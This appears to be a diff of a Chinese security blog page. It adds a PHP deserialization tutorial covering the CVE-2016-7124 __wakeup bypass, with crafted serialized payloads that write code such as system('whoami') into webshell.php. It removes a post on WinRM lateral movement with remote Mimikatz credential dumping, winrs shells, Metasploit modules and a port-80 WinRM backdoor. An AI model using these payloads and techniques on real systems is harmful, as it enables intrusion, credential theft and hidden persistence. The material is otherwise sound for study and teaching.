+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">?test=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201208619.png" alt="image-20211025201208619"></p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025201203470.png" alt="image-20211025201203470"></p>
+<h4 id="实例展示"><a href="#实例展示" class="headerlink" title="实例展示"></a>实例展示</h4><h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>构造序列化字符串时，可以根据要进行序列化操作的类中的成员变量，写一份简易序列化函数，用于调试payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$target</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br></pre></td></tr></table></figure>
+
+<p>运行拿到序列化字符串:</p>
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210307399.png" alt="image-20211025210307399"></p>
+<p>由于成员变量为protected模式，由此可知乱码为:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;hello&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>修改成员变量数目，绕过__wakeup()魔法函数，修改变量值长度与内容，添加恶意代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"> O:1:&quot;A&quot;:1：&#123;s:9:&quot;%00*%00target&quot;;s:26:&quot;&lt;?php system(&#x27;whoami&#x27;); ?&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025210652227.png" alt="image-20211025210652227"></p>
+<h4 id="CVE-2016-7124"><a href="#CVE-2016-7124" class="headerlink" title="CVE-2016-7124"></a>CVE-2016-7124</h4><p>影响版本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span></span><br><span class="line">PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br></pre></td></tr></table></figure>
+
+<p>当序列化对象进行反序列化时，如果表示对象属性个数的值大于真实的属性个数时，就会跳过_wakeup()的执行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看此处代码可看出，当我们对类A进行反序列处理时，无论在$test处确立的target值为多少，unserialize()的前一刻都会触发A的__wakeup魔术方法，将序列化字符串中的target值处理为<code>wakeup</code>,最后调用析构函数____destruct()执行内部代码，将target值写入到文件之中，然后在php文件的结尾包含webshell.php之中进行执行。</p>
+<p>此处存在一处漏洞点，定义的序列化字符串属性个数大于真实的字符串属性个数时，__wakeup()魔法函数将不会生效:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">源:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;&#125;</span><br><span class="line">改:O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;target&quot;</span>;s:<span class="number">18</span>:<span class="string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;&#125;</span><br><span class="line">在序列化字符串中，只修改成员变量的值无效，还需修改其长度为对应长度大小。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025204112483.png" alt="image-20211025204112483"></p>
+<p>若类中成员变量为protected  、 private类型，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$target</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;target = <span class="string">&quot;wakeup!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$fp</span> = fopen(<span class="string">&quot;D:\\phpstudy_pro\\WWW\\phplearn\\webshell.php&quot;</span>,<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        fputs(<span class="variable">$fp</span>,<span class="keyword">$this</span>-&gt;target);</span><br><span class="line">        fclose(<span class="variable">$fp</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$test_unseria</span> = unserialize(<span class="variable">$test</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;webshell.php&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;.\webshell.php&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php序列化字符串在相应成员函数处如下所示</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> 类型:在变量名前加上%<span class="number">00</span>*%<span class="number">00</span></span><br><span class="line">?file=O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00*%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br><span class="line"><span class="keyword">private</span>类型:%<span class="number">00</span>类名%<span class="number">00</span>变量名</span><br><span class="line">O:<span class="number">1</span>:<span class="string">&quot;A&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">9</span>:<span class="string">&quot;%00A%00target&quot;</span>;s:<span class="number">25</span>:<span class="string">&quot;&lt;?php system(&#x27;whoami&#x27;);?&gt;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-3.assets/image-20211025205746814.png" alt="image-20211025205746814"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/10/24/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0-2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2491,150 +2681,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://antipassion.github.io/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/Nayon.png">
-      <meta itemprop="name" content="Nayon">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="林中小屋">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="post-title-link" itemprop="url">WinRM-横向移动</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-09-26 15:08:44" itemprop="dateCreated datePublished" datetime="2021-09-26T15:08:44+08:00">2021-09-26</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-01-25 21:37:24" itemprop="dateModified" datetime="2022-01-25T21:37:24+08:00">2022-01-25</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%9F%9F%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">域渗透</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
-<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure>
-
-<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
-<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
-<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
-<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
-<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
-<p>利用导出的凭证，继续横向渗透。</p>
-<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
-<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>
-
-<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
-<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
-<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
-<p><strong>利用winrs远程执行:</strong></p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
-<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
-<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
-<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
-<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
-<p>此处未能成功执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
-<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
-<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
-<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
-<p>​    <strong>2.端口复用做后门</strong></p>
-<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
-<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    （2）链接目标</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>
-
-<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -2702,7 +2752,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">20</span>
+          <span class="site-state-item-count">21</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
